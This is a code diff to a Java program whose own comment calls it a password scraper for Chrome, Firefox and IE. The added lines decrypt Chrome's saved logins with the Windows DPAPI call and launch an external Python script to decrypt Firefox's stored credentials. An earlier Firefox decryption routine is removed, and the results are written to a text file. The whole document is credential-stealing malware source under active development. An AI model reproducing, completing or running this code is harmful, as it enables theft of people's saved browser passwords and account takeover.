@@ -1,8 +1,5 @@
 // Password Scraper for Chrome/Firefox/IE for Windows/Linux/Mac
 import java.util.*;
-import java.util.Base64;
-
-import javax.crypto.Cipher;
 
 // Apache Libs
 import org.apache.commons.io.FileUtils;
@@ -10,18 +7,17 @@ import org.apache.commons.io.FileUtils;
 // WIN32 Native Functions
 import com.sun.jna.platform.win32.*;
 
-import sun.security.pkcs11.*;
-import sun.security.pkcs11.wrapper.PKCS11;
-
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
 // Standard Java IO
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.io.FileOutputStream;
 import java.io.FileReader;
+import java.io.FileWriter;
 import java.io.PrintStream;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
+
 // SQLite libraries
 import java.sql.DriverManager;
 import java.sql.Connection;
@@ -35,24 +31,14 @@ import org.json.JSONObject;
 import org.json.simple.parser.JSONParser;
 import org.json.simple.parser.ParseException;
 
-// Mozilla Security Suite for Java
-import org.mozilla.jss.*;
-import org.mozilla.jss.CryptoManager.NotInitializedException;
-import org.mozilla.jss.crypto.AlreadyInitializedException;
-import org.mozilla.jss.pkcs11.PK11Token;
-
 // Java Sec Suite
 import java.security.*;
-import java.security.spec.KeySpec;
 
-import javax.crypto.Cipher;
-import javax.crypto.SecretKey;
-import javax.crypto.SecretKeyFactory;
-import javax.crypto.spec.DESedeKeySpec;
-import javax.crypto.spec.IvParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
+// Jython Libs
+import org.python.core.*;
+import org.python.util.PythonInterpreter;
 
-public class jdec {
+public class jdec extends Crypt32Util {
 	
 	public static void ChromeDec() throws IOException, SQLException {
 		
@@ -119,6 +105,7 @@ public class jdec {
 	
 		// Decrypt data
 		while(x != cint) {
+			unencrypted.add(cryptUnprotectData(bytearray.get(x), 0));
 			x++;
 		}
 	
@@ -134,7 +121,7 @@ public class jdec {
 		}
 	}
 	
-	public static void FirefoxDec() throws IOException, ParseException, GeneralSecurityException, KeyDatabaseException, CertDatabaseException, AlreadyInitializedException, NotInitializedException {
+	public static void FirefoxDec() throws IOException, ParseException, GeneralSecurityException {
 		
 		// Get username
 		String user = System.getProperty("user.name");
@@ -175,6 +162,13 @@ public class jdec {
 		JSONObject ffobj = new JSONObject(ffdata);
 		JSONArray logins = ffobj.getJSONArray("logins");
 		
+		// Execute Python script -- lucky for us this needs very little configuration
+		try{
+		ProcessBuilder pb = new ProcessBuilder("python 'to-do-path' --choice 1 --no-interaction");
+		Process p = pb.start();
+		System.out.print(p.getInputStream());
+		}catch(Exception e){System.out.println(e);}
+		
 		// Put into arrays
 		
 		// URLS
@@ -202,50 +196,12 @@ public class jdec {
 			ffencryptedpasswords.add(logins.getJSONObject(j).getString("encryptedPassword"));
 		}
 		
-		CryptoManager.initialize(".");
-		CryptoManager cm = CryptoManager.getInstance();
-		
-		// Get python script to decrypt key3.db or retrieve keys, better yet just run python
-		// script here to decrypt everything
-		
-		// First key from key3.db goes here
-		SecureRandom sr = new SecureRandom();
-		byte[] key = new byte[8];
-		sr.nextBytes(key);
-		KeySpec ks = new DESedeKeySpec(key);
-		SecretKeyFactory skf = SecretKeyFactory.getInstance("DESEDE_ENCRYPTION_SCHEME");
-		SecretKey ffkey = skf.generateSecret(ks);
-		
-		Cipher cipher = Cipher.getInstance("DESede");
-		
 		System.out.println("Firefox usernames and passwords: ");
-		
-		// Decode usernames, 
-		for(String username : ffencryptedusernames){
-			try{
-			cipher.init(Cipher.DECRYPT_MODE, ffkey);
-			byte[] encryptedText = Base64.getDecoder().decode(username);
-			byte[] plainText = cipher.doFinal(encryptedText);
-			ffdecryptedusernames.add(new String(plainText));
-			System.out.println("Username: " + new String(plainText));
-			}catch(Exception e){e.printStackTrace();}
-		}
-		
-		// Decode passwords
-		for(String password : ffencryptedpasswords){
-			try{
-			cipher.init(Cipher.DECRYPT_MODE, ffkey);
-			byte[] encryptedText = Base64.getDecoder().decode(password);
-			byte[] plainText = cipher.doFinal(encryptedText);
-			ffdecryptedpasswords.add(new String(plainText));
-			System.out.println("Password: " + new String(plainText));
-			}catch(Exception e){e.printStackTrace();}
-		}
 		
 	}
 	
 	
-	public static void main(String[] args) throws SQLException, IOException, ParseException, GeneralSecurityException, KeyDatabaseException, CertDatabaseException, AlreadyInitializedException, NotInitializedException {
+	public static void main(String[] args) throws SQLException, IOException, ParseException, GeneralSecurityException {
 		
 		// Redirect output to text file
 		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
